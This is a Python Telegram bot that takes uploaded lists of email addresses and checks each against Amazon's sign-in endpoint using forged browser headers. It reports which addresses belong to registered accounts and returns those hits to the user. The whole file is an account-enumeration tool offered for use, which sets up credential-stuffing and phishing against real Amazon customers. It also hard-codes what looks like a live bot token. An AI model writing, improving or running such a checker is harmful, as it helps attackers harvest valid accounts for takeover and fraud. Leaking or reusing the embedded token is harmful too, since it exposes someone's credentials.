import re
import requests
from requests import Session
from telebot import TeleBot
import random
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)

# Initialize the bot
bot = TeleBot("7080612095:AAEhR6MhrPXXl2Ou-dZWm7gICwl2MNxAa2c")

# List of admin user IDs
admins = [5084753170]

def check_email(email: str) -> bool:
    logging.info(f"Checking email: {email}")
    url = "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
    session = Session()
    try:
        resp = session.get(url)
        resp.raise_for_status()
        pattern = r'<meta name="page_identifier" content="([^"]+)">'
        matches = re.findall(pattern, resp.text)
        page_id = matches[0] if matches else None
        if not page_id:
            logging.error("Page ID not found")
            return False

        headers = {
            'Host': 'www.amazon.com',
            'Content-Length': '415',
            'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122")',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
            'X-Dtpc': '3$193658394_898h6vPAINECCRUEPPTMRAUGUDPISICBWQPAMG-0e0',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Origin': 'https://www.amazon.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Priority': 'u=1, i'
        }

        data = {
            "context": "IndividualIdProofing",
            "IndividualIdProofing.FULL_email_TIN": email,
            "chimeraRegisteredPageData": {"pageId": page_id}
        }

        response = session.post(url, json=data, headers=headers)
        response.raise_for_status()
        is_valid = "Password" not in response.text
        logging.info(f"Email {email} is valid: {is_valid}")
        return is_valid
    except Exception as e:
        logging.error(f"Error checking email {email}: {e}")
        return False
    finally:
        session.close()

def save_email(email: str, name: str):
    try:
        with open(f"succ-{name}.txt", 'a') as file:
            file.write(f"{email}\n")
        logging.info(f"Email {email} saved to succ-{name}.txt")
    except Exception as e:
        logging.error(f"Error saving email {email}: {e}")

def send_telegram(email: str, telegram_id: int):
    try:
        bot.send_message(telegram_id, f"NEW Working email: {email}")
        logging.info(f"Sent telegram message for email {email} to {telegram_id}")
    except Exception as e:
        logging.error(f"Error sending telegram message for email {email}: {e}")

@bot.message_handler(content_types=['document'])
def doc_handler(message):
    try:
        successful = 0
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        file_url = f'https://api.telegram.org/file/bot{bot.token}/{file_info.file_path}'
        response = requests.get(file_url)
        if response.status_code == 200:
            name = str(random.randint(1000000000, 9999999999))
            document_content = response.content.decode("utf-8")
            logging.info(f"Document content: {document_content}")
            emails = document_content.splitlines()
            logging.info(f"Received email file with {len(emails)} emails")
            bot.send_message(message.chat.id, "Successfully received email file")
            bot.send_message(message.chat.id, f"Checking 🕐... ID: {name}")
            for email in emails:
                if check_email(email):
                    successful += 1
                    send_telegram(email, message.chat.id)
                    save_email(email, name)
            try:
                with open(f"succ-{name}.txt", "r") as file:
                    bot.send_document(message.chat.id, document=file)
                bot.send_message(message.chat.id, "Done checking")
                bot.send_message(message.chat.id, f"Success: {successful}")
            except Exception as e:
                logging.error(f"Error sending document: {e}")
                bot.send_message(message.chat.id, "Error processing the file")
        else:
            logging.error(f"Failed to download the file: {response.status_code}")
            bot.send_message(message.chat.id, "Failed to download the file")
    except Exception as e:
        logging.error(f"Error in doc_handler: {e}")
        bot.send_message(message.chat.id, "Error processing the file")

bot.polling()
